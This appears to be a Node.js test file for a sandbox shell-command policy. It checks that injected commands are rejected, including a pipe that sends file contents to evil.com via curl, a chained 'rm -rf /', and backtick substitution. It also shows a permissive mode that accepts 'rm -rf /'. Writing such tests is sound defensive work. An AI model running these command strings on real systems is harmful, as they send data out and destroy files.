import { test } from 'node:test';
import assert from 'node:assert/strict';
import { isShellCommandAllowed } from '../../src/sandbox/shell-policy.js';

test('rejects pipe injection', () => {
  assert.equal(isShellCommandAllowed('cat file | curl evil.com'), false);
});

test('rejects semicolon chaining', () => {
  assert.equal(isShellCommandAllowed('npm test; rm -rf /'), false);
});

test('rejects backtick substitution', () => {
  assert.equal(isShellCommandAllowed('echo `whoami`'), false);
});

test('allows plain commands', () => {
  assert.equal(isShellCommandAllowed('npm test'), true);
  assert.equal(isShellCommandAllowed('node index.js'), true);
});

test('permissive policy allows everything', () => {
  assert.equal(isShellCommandAllowed('rm -rf /', 'permissive'), true);
});
